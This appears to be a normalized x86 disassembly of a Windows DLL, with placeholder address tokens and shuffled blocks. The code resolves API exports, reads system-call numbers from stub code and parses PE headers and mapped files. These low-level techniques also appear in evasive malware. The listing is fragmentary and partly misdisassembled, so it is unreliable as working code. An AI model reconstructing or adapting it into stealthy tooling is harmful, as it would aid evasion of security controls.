mov esi [ esp + 0xc ]
push edi
test esi esi
je r-xdata
xor al al
cmp [ esp + 0x14 ] 0x0
je r-xdata
lea edi [ esi + 0x18 ]
push rw-data
push edi
call sub_10009b69
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
push rw-data
push edi
call sub_10009b69
pop ecx
test eax eax
pop ecx
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ ecx ] eax
mov [ esi + 0x4 ] ebx
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_1000be67
push ebp
mov ebp esp
sub esp 0x14
push 0x14
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call memset
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
call sub_1000bfba
add esp 0x14
test eax eax
jne r-xdata
leave
retn
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x10 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0xc ]
mov [ ecx ] edx
mov ecx [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x1c ]
mov edx [ ebp - 0x4 ]
mov [ ecx ] edx
sub_1000beb7
push esi
push rw-data
call sub_1000bef0
mov esi eax
mov [ esp ] rw-data
call sub_1000bef0
test esi esi
pop ecx
je r-xdata
push 0xffffffd4
pop eax
pop esi
retn
test eax eax
je r-xdata
mov ecx [ esp + 0x8 ]
inc eax
inc esi
mov [ ecx ] eax
mov eax [ esp + 0xc ]
mov [ eax ] esi
xor eax eax
pop esi
retn
sub_1000bef0
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
push rw-data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x1c ] eax
xor ebx ebx
cmp eax ebx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x24 ] ebx
xor esi esi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp [ eax ] 0xb8
jne r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
mov eax esi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_1000bfb0
inc eax
mov [ ebp - 0x20 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
cmp [ eax + 0x3 ] bl
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x24 ] 0xa
jge r-xdata
cmp [ eax + 0x4 ] bl
jne r-xdata
inc eax
mov [ ebp - 0x2c ] eax
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov esi eax
sub_1000bfba
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
lea eax [ ebp - 0x8 ]
push edi
push eax
lea eax [ ebp - 0xc ]
push eax
xor esi esi
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
call sub_1000c47d
add esp 0xc
cmp eax esi
mov [ ebp - 0x18 ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] esi
xor bl bl
cmp [ eax + 0x6 ] si
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x10 ] esi
jbe r-xdata
mov esi [ LocalFree@IAT ]
push eax
call esi
push [ ebp - 0x8 ]
call esi
push 0xfffffff1
pop eax
jmp r-xdata
mov edi [ strncmp@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp - 0x8 ]
push 0x8
add eax esi
push rw-data
push eax
call edi
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov bl 0x1
lea ecx [ esi + eax ]
mov eax [ esi + eax + 0xc ]
sub eax [ ecx + 0x14 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
test bl bl
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1 ] 0x1
mov eax [ esi + eax + 0x14 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
inc [ ebp - 0x10 ]
add esi 0x28
movzx ecx [ eax + 0x6 ]
cmp [ ebp - 0x10 ] ecx
jb r-xdata
mov eax [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
push 0x8
add eax esi
push rw-data
push eax
call edi
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov esi [ ebp + 0xc ]
mov eax [ eax + 0x34 ]
add eax [ ebp - 0x18 ]
lea ebx [ esi + 0x10 ]
lea ecx [ esi + 0xc ]
lea edx [ esi + 0x8 ]
push ebx
lea edi [ esi + 0x4 ]
push ecx
push edx
push edi
push esi
push eax
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ecx
push eax
mov [ ebp + 0xc ] edx
push [ ebp + 0x8 ]
call sub_1000c11a
add esp 0x20
mov [ ebp - 0x18 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax 0x1000
push rw-data
add [ esi ] eax
add [ edi ] eax
call sub_1000c932
pop ecx
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x34 ]
cmp eax edx
je r-xdata
mov esi [ LocalFree@IAT ]
push ecx
call esi
push [ ebp - 0x8 ]
call esi
mov eax [ ebp - 0x18 ]
mov esi eax
sub esi edx
mov edx [ ebp + 0xc ]
add [ edx ] esi
mov edx [ ebp - 0x10 ]
mov esi eax
sub esi [ ecx + 0x34 ]
add [ edx ] esi
sub eax [ ecx + 0x34 ]
add [ ebx ] eax
jmp r-xdata
sub_1000c11a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x10
push ebx
lea eax [ ebp - 0x2c ]
push eax
call memset
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call sub_1000c8af
add esp 0x14
test al al
jne r-xdata
mov [ ebp - 0x4 ] ebx
call [ GetVersion@IAT ]
mov [ ebp - 0x34 ] eax
movzx eax al
mov [ ebp - 0x38 ] eax
xor ecx ecx
mov cl [ ebp - 0x33 ]
movzx ecx cl
mov [ ebp - 0x30 ] ecx
cmp eax 0x4
ja r-xdata
push 0xffffffd2
pop eax
jmp r-xdata
mov [ ebp - 0x1c ] 0xffffffbe
mov edi [ ebp + 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
push edi
lea eax [ ebp - 0x2c ]
push eax
call sub_1000c237
add esp 0x14
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
call sub_1000c22c
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov esi [ eax ]
mov [ ebp - 0x3c ] esi
push [ ebp + 0x20 ]
push esi
push [ edi ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000c454
add esp 0x10
mov [ ebp - 0x1c ] eax
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
push [ ebp + 0x24 ]
lea eax [ esi + 0x1 ]
push eax
push [ edi ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1000c454
add esp 0x10
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
mov eax [ edi ]
lea eax [ eax + esi * 4 ]
add eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x1c ]
mov [ ecx ] eax
sub_1000c237
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi 0x100
push ebx
push edi
push 0x1a4
push r--data
push [ esi ]
push 0x5c
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_1000c367
add esp 0x20
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
je r-xdata
mov edi 0x12c
push ebx
push edi
push 0xd9
push r--data
push [ esi ]
push 0x50
push [ ebp + 0x18 ]
push [ ebp + 0x8 ]
call sub_1000c367
add esp 0x20
test eax eax
jl r-xdata
push ebx
push edi
push 0x1a1
push r--data
push [ esi ]
push 0x5c
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_1000c367
add esp 0x20
test eax eax
jl r-xdata
je sub_1000c360
je r-xdata
push ebx
push edi
push 0xeb
push r--data
push [ esi ]
push 0x50
push [ ebp + 0x18 ]
push [ ebp + 0x8 ]
call sub_1000c367
add esp 0x20
test eax eax
jl r-xdata
push ebx
push edi
push 0x11a
push r--data
push [ esi ]
push 0x5c
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_1000c367
add esp 0x20
test eax eax
jl r-xdata
je sub_1000c360
je r-xdata
push ebx
mov ebx 0xd4
push edi
push ebx
push r--data
push [ esi ]
push 0x50
push [ ebp + 0x18 ]
push [ ebp + 0x8 ]
call sub_1000c367
add esp 0x20
test eax eax
jl r-xdata
push 0xfffffff3
jmp r-xdata
je sub_1000c360
pop eax
jmp r-xdata
push [ ebp + 0x10 ]
push edi
push ebx
push r--data
push [ esi ]
push 0x50
push [ ebp + 0x18 ]
push [ ebp + 0x8 ]
call sub_1000c367
add esp 0x20
test eax eax
jl r-xdata
je sub_1000c360
push 0xfffffff2
sub_1000c367
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_1000c3d0
mov ecx [ ebp + 0xc ]
add esp 0x18
test ecx ecx
mov [ ecx ] eax
jge r-xdata
lea ecx [ ebp + 0x20 ]
push ecx
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
call sub_1000c454
add esp 0x10
test eax eax
jne r-xdata
mov eax ecx
pop ebp
retn
pop ebp
retn
push [ ebp + 0x1c ]
mov eax [ ebp + 0x20 ]
sub eax [ ebp + 0x24 ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x8 ]
call sub_1000cb87
imul eax eax 0x64
cdq
idiv [ ebp + 0x1c ]
add esp 0x10
cmp eax [ ebp + 0x10 ]
jl r-xdata
xor eax eax
sub_1000c3d0
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
xor ebx ebx
lea edi [ esi + eax * 4 ]
mov [ ebp - 0x4 ] ebx
cmp esi edi
mov [ ebp - 0x8 ] ebx
mov [ ebp + 0xc ] esi
jae r-xdata
mov eax [ ebp - 0x8 ]
sub eax esi
shr eax 0x2
lea eax [ ebp + 0x18 ]
push 0x4
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000ca0a
add esp 0x10
test al al
je r-xdata
push 0xfffffffc
pop eax
jmp r-xdata
push [ ebp + 0x14 ]
mov eax [ ebp + 0x18 ]
sub eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_1000cb87
add esp 0x10
cmp eax ebx
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov [ ebp - 0x4 ] ebx
mov ebx eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
add [ ebp + 0xc ] 0x4
cmp [ ebp + 0xc ] edi
jb r-xdata
mov [ ebp - 0x4 ] eax
sub_1000c454
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push 0x4
push [ esp + 0x14 ]
lea eax [ ecx + eax * 4 ]
push eax
push [ esp + 0x10 ]
call sub_1000ca0a
add esp 0x10
neg al
sbb eax eax
and eax 0x4
add eax 0xfffffffc
retn
sub_1000c492
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
push rw-data
mov esi [ ebp + 0x8 ]
push esi
call sub_10009b69
mov edi eax
push rw-data
push esi
call sub_10009b69
mov [ ebp - 0x2c ] eax
push rw-data
push esi
call sub_10009b69
mov [ ebp - 0x3c ] eax
push rw-data
push esi
call sub_10009b69
mov [ ebp - 0x34 ] eax
push rw-data
push esi
call sub_10009b69
mov [ ebp - 0x24 ] eax
push rw-data
push esi
call sub_10009b69
mov [ ebp - 0x20 ] eax
push rw-data
push esi
call sub_10009b69
add esp 0x38
mov [ ebp - 0x38 ] eax
xor ebx ebx
cmp edi ebx
je r-xdata
push 0x1
cmp [ ebp - 0x2c ] ebx
je r-xdata
cmp [ ebp - 0x3c ] ebx
je r-xdata
cmp [ ebp - 0x34 ] ebx
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call edi
mov esi eax
mov [ ebp - 0x30 ] esi
cmp esi ebx
jne r-xdata
cmp [ ebp + 0x18 ] bl
je r-xdata
push 0xffffffb8
jmp r-xdata
push esi
call [ ebp - 0x3c ]
mov [ ebp - 0x4 ] ebx
push ebx
push ebx
push esi
call [ ebp - 0x24 ]
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
pop eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
call memcpy
add esp 0xc
push esi
push edi
call [ ebp - 0x38 ]
cmp [ ebp + 0x18 ] bl
je r-xdata
cmp [ ebp + 0x18 ] bl
je r-xdata
or [ esi + 0x7 ] 0x20
push ebx
push ebx
push ebx
push 0x1
push ebx
push esi
call [ ebp - 0x34 ]
mov edi eax
cmp edi ebx
jne r-xdata
push esi
call [ ebp - 0x2c ]
mov eax ebx
jmp r-xdata
push esi
call [ ebp - 0x20 ]
push 0xffffffb7
pop ebx
jmp r-xdata
push esi
call [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000c600
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
jne r-xdata
mov esp ebp
pop ebp
jmp [ rw-data ]
push 0x0
call sub_1000c640
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000c640
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov [ rw-data ] eax
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov al 0x1
retn
xor al al
retn
sub_1000c680
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
push ebx
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push ebx
push 0x3
call sub_1000c7e7
add esp 0x14
test al al
je r-xdata
xor al al
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x1c ]
call [ free@IAT ]
pop ecx
mov eax [ ebp - 0x1c ]
lea esi [ eax + 0x4 ]
xor edi edi
mov [ ebp - 0x4 ] ebx
push rw-data
push [ esi + 0x4 ]
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ esi + 0x4 ]
call [ wcslen@IAT ]
pop ecx
mov ecx [ esi + 0x4 ]
lea esi [ ecx + eax * 2 + 0x2 ]
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x2c ] esi
mov eax esi
and eax 0x3
je r-xdata
mov bl 0x1
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
inc edi
jmp r-xdata
add esi eax
mov [ ebp - 0x24 ] esi
push [ ebp - 0x1c ]
call [ free@IAT ]
pop ecx
or [ ebp - 0x4 ] 0xffffffff
mov al bl
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp edi [ eax ]
jae r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000c755
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
xor eax eax
push rw-data
call [ GetModuleHandleA@IAT ]
push [ ebp + 0x8 ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x24 ] ebx
or [ ebp - 0x4 ] 0xffffffff
cmp [ eax ] 0xb8
jne r-xdata
inc eax
mov [ ebp - 0x20 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
cmp [ eax + 0x3 ] bl
jne r-xdata
cmp [ ebp - 0x24 ] 0xa
jge r-xdata
cmp [ eax + 0x4 ] bl
jne r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov eax [ eax ]
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000c7e7
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
xor edi edi
cmp ebx edi
je r-xdata
xor al al
mov esi [ ebp + 0x14 ]
cmp esi edi
je r-xdata
cmp [ rw-data ] edi
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ ebx ] edi
mov ebx [ ebp + 0x18 ]
mov [ esi ] edi
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
cmp eax edi
mov [ rw-data ] eax
je r-xdata
push ebx
push edi
call [ realloc@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
add ebx 0x400
cmp ebx 0x2800
ja r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edi esi
push eax
push ebx
push esi
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call [ rw-data ]
cmp eax 0xc0000004
jne r-xdata
push edi
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ eax ] esi
mov eax [ ebp - 0x4 ]
mov [ ecx ] eax
mov al 0x1
jmp r-xdata
test esi esi
je r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
call [ free@IAT ]
pop ecx
sub_1000c8af
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
cmp esi edi
je r-xdata
xor al al
jmp r-xdata
lea eax [ ebp + 0xc ]
mov [ ebp + 0xc ] edi
push eax
push [ ebp + 0x8 ]
call [ GetFileSize@IAT ]
push edi
push edi
push edi
push 0x2
push edi
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esi + 0xc ] eax
call [ CreateFileMappingA@IAT ]
cmp eax edi
mov [ esi ] eax
je r-xdata
pop edi
pop esi
pop ebp
retn
push edi
push edi
push edi
push 0x4
push eax
call [ MapViewOfFile@IAT ]
cmp eax edi
mov [ esi + 0x4 ] eax
jne r-xdata
mov al 0x1
push [ esi ]
call [ CloseHandle@IAT ]
mov [ esi ] edi
sub_1000c912
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push [ esi ]
call [ CloseHandle@IAT ]
and [ esi ] 0x0
and [ esi + 0x4 ] 0x0
mov al 0x1
pop esi
retn
xor al al
pop esi
retn
sub_1000c932
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] edi
push edi
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0xb
call sub_1000d4f0
add esp 0x10
test al al
je r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x20 ] edi
je r-xdata
mov ebx eax
mov [ ebp - 0x2c ] ebx
lea esi [ eax + 0x4 ]
mov [ ebp - 0x24 ] esi
and [ ebp - 0x28 ] edi
xor edi edi
imul eax eax 0x11c
lea edi [ eax + esi ]
movzx ecx [ edi + 0x1a ]
add ecx eax
lea eax [ ecx + esi + 0x1c ]
mov [ ebp - 0x30 ] eax
push [ ebp + 0x8 ]
push eax
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ ebp - 0x28 ]
jmp r-xdata
mov edi [ edi + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebx ]
jae r-xdata
sub_1000c9ce
fsubr st3
leave
xor edi edi
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
mov eax edi
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000ca0a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x8 ]
xor eax eax
cmp ecx eax
je r-xdata
xor al al
cmp [ ebp + 0x10 ] eax
je r-xdata
mov esi [ ebp + 0x14 ]
cmp esi eax
je r-xdata
mov edi [ ebp + 0xc ]
lea edx [ edi + esi ]
cmp eax [ ecx + 0xc ]
jb r-xdata
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ecx + 0x4 ]
add eax edi
push eax
push [ ebp + 0x10 ]
call memcpy
add esp 0xc
or [ ebp - 0x4 ] 0xffffffff
mov al 0x1
jmp r-xdata
ja r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp edx [ ecx + 0x8 ]
ja r-xdata
sub_1000ca8f
push esi
mov esi [ esp + 0x10 ]
push edi
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
retn
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
sub ecx edx
inc edx
dec esi
jne r-xdata
inc edi
mov al [ ecx + edx ]
cmp al [ edx ]
jne r-xdata
sub_1000cab6
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ SetFilePointer@IAT ]
xor ebx ebx
push edi
push ebx
push ebx
push 0x3c
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ebx
call esi
cmp eax 0x3c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edi [ ReadFile@IAT ]
push ebx
push eax
lea eax [ ebp - 0x8 ]
push 0x4
push eax
push [ ebp + 0x8 ]
call edi
push ebx
push ebx
push [ ebp - 0x8 ]
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
call esi
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0xfffffffd
jmp r-xdata
mov esi 0xf8
push esi
push 0x40
call [ LocalAlloc@IAT ]
mov ebx [ ebp + 0xc ]
lea ecx [ ebp - 0x4 ]
push 0x0
push ecx
push esi
push eax
push [ ebp + 0x8 ]
mov [ ebx ] eax
call edi
cmp [ ebp - 0x4 ] esi
je r-xdata
pop eax
jmp r-xdata
mov eax [ ebx ]
movzx eax [ eax + 0x6 ]
lea esi [ eax + eax * 4 ]
shl esi 0x3
push esi
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0x10 ]
push 0x0
mov [ ecx ] eax
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push eax
push [ ebp + 0x8 ]
call edi
cmp [ ebp - 0x4 ] esi
je r-xdata
push [ ebx ]
call [ LocalFree@IAT ]
and [ ebx ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
push [ ebx ]
mov esi [ LocalFree@IAT ]
call esi
mov edi [ ebp + 0x10 ]
push [ edi ]
call esi
and [ ebx ] 0x0
and [ edi ] 0x0
push 0xfffffffc
sub_1000cb87
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
cmp eax ecx
push edi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x14 ]
cmp ecx [ eax + 0xc ]
lea edx [ esi + edi ]
jb r-xdata
mov eax [ eax + 0x4 ]
push edi
add eax esi
push eax
push [ ebp + 0x10 ]
call sub_1000ca8f
add esp 0xc
jmp r-xdata
ja r-xdata
pop edi
pop esi
pop ebp
retn
push 0xfffffffd
jmp r-xdata
cmp edx [ eax + 0x8 ]
jbe r-xdata
pop eax
sub_1000cbe0
push ecx
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
test esi esi
push edi
mov [ esp + 0x10 ] 0x0
jne r-xdata
mov ebp [ esp + 0x20 ]
test ebp ebp
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov ebx [ esp + 0x24 ]
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov edi [ esp + 0x1c ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
push 0x4
push 0x4
push 0x4
push 0x4
push 0x4
push 0x4
push 0x4
push 0x4
push 0x2
push 0x9200
call sub_1000cfc0
add esp 0x28
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
cmp [ esi ] 0x40
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
cmp [ esi + 0x8 ] ebx
jbe r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
lea eax [ esp + 0x10 ]
push 0x0
push eax
add edi 0xfffffff4
push ebp
add esi 0xc
push edi
push esi
call sub_1000d060
mov ecx [ esp + 0x24 ]
add esp 0x14
neg eax
sbb eax eax
pop edi
not eax
pop esi
pop ebp
and eax ecx
pop ebx
pop ecx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
sub_1000cca0
sub esp 0x20
push esi
call sub_1000ce30
mov esi eax
and esi 0x1
call sub_1000ce30
and esi eax
cmp esi 0x1
je r-xdata
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x14 ] 0x0
xor eax eax
or eax 0xffffffff
pop esi
add esp 0x20
retn
mov [ esp + eax + 0x14 ] al
inc eax
cmp eax 0x10
jl r-xdata
mov ecx [ esp + 0x14 ]
xor eax eax
cmp ecx 0x3020100
mov edx 0x100
sete al
xor ecx ecx
cmp [ esp + 0x14 ] dx
sete cl
and eax ecx
and eax 0x1
mov esi eax
and esi 0x1
cmp esi 0x1
jne r-xdata
and esi 0x1
cmp esi 0x1
jne r-xdata
xor eax eax
lea ecx [ esp + 0x4 ]
and esi 0x1
cmp esi 0x1
jne r-xdata
xor eax eax
lea ecx [ esp + 0x4 ]
mov si [ esp + eax + 0x14 ]
inc eax
mov [ ecx ] si
add ecx 0x2
cmp eax 0x4
jl r-xdata
xor eax eax
cmp [ esp + 0xa ] 0x403
sete al
xor ecx ecx
cmp [ esp + 0x8 ] 0x302
sete cl
and eax ecx
xor ecx ecx
cmp [ esp + 0x6 ] 0x201
sete cl
and eax ecx
xor ecx ecx
cmp [ esp + 0x4 ] dx
sete cl
and eax ecx
and eax 0x1
mov esi eax
mov eax esi
pop esi
dec eax
neg eax
sbb eax eax
add esp 0x20
retn
call sub_1000cf90
mov esi eax
neg esi
sbb esi esi
inc esi
and esi 0x1
cmp esi 0x1
jne r-xdata
mov edx [ esp + eax + 0x14 ]
inc eax
mov [ ecx ] edx
add ecx 0x4
cmp eax 0x4
jl r-xdata
mov ecx [ esp + 0xc ]
mov esi [ esp + 0x8 ]
xor eax eax
